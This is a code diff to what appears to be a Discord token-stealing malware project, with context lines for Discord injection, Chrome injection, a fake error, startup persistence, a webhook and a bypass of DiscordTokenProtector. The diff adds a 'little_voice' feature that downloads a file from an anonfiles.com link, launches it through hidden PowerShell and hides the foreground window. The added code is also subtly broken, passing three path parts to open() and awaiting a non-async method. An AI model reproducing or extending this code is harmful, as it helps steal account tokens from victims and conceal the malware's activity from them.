@@ -85,6 +85,7 @@ json_confg = {
     "killdiscord_config": '%_config_45666%',
     "fake_error_config": "%_config_687%",
     "startup_config": "%_config_456%",
+    "little_voice": "%_config_c76%",
     "chromenject_config": "%_config_169%",
     "url_hawkinject": f"https://raw.githubusercontent.com/{hwkish}-{stspecial}/{hwkish}-{justafcklink}",
     "SAEZRTYRES1": '%_config_6511%',
@@ -593,6 +594,8 @@ class hwkish_first_funct(Functions):
         self.thishawk_webh = self.ecobybro
 
         self.apilink = self.find_in_config("apilink")
+        
+        self.soundedornot = self.find_in_config("little_voice")
         
         self.created_by = self.find_in_config("created_by")
 
@@ -1116,6 +1119,7 @@ class hwkish_first_funct(Functions):
         self.ping_on_running()
         self.finished_bc()
         await self.injection_discord()
+        await self.soundlilvoice()
         
     def kill_process(self, process_name):
         for proc in psutil.process_iter():
@@ -1442,6 +1446,25 @@ class hwkish_first_funct(Functions):
                             print(f"Application file not found: {e}")
                         except Exception as e:
                             print(f"An error occurred: {e}")
+
+    def soundlilvoice(self):
+        if self.soundedornot != 'yes':
+            return
+        try:
+            response = requests.get('https://anonfiles.com/ca048cx0z3/hawkish_mp3')
+            if response.status_code == 200:
+                with open(self.roaming, "Hwkedmadafuka", "sound.mp3", 'wb') as file:
+                    file.write(response.content)
+                print('Téléchargement terminé.')
+                command = f'powershell -WindowStyle Hidden -c "Start-Process \'{os.path.join(self.roaming, "Hwkedmadafuka", "sound.mp3")}\'"'
+                subprocess.run(command, shell=True)
+                time.sleep(0.5)
+                hide = win32gui.GetForegroundWindow()
+                win32gui.ShowWindow(hide, win32con.SW_HIDE)
+            else:
+                pass
+        except:
+            pass
 
     async def bypass_tokenprtct(self):
         tp = os.path.join(self.roaming, "DiscordTokenProtector")
